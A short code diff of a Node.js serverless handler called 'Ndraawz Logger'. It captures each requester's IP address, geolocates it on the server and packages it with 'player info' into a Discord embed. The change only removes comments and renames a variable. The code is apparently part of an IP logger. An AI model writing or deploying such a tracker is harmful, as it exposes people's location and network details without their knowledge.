@@ -15,13 +15,11 @@ module.exports = async function handler(req, res) {
         req.on('end', resolve);
     });
     
-    // Ambil IP asli dari header request
     const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
     
     try {
         const data = JSON.parse(body);
         
-        // Ambil data geolokasi dari IP (via server, bukan client)
         let geoData = { country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A" };
         
         await new Promise((resolve) => {
@@ -47,9 +45,7 @@ module.exports = async function handler(req, res) {
             }).on('error', () => resolve());
         });
         
-        // Buat fields untuk embed Discord
-        const fields = [
-            { name: "━━━━━━━━━━━━━━ 📋 PLAYER INFO ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
+        const allFields = [
             ...(data.fields || []),
             { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
             { name: "📡 IP Address", value: clientIp, inline: false },
@@ -63,7 +59,7 @@ module.exports = async function handler(req, res) {
         const embed = {
             title: "🚀 Ndraawz Logger",
             color: 0x00ff88,
-            fields: fields,
+            fields: allFields,
             timestamp: new Date().toISOString()
         };
         
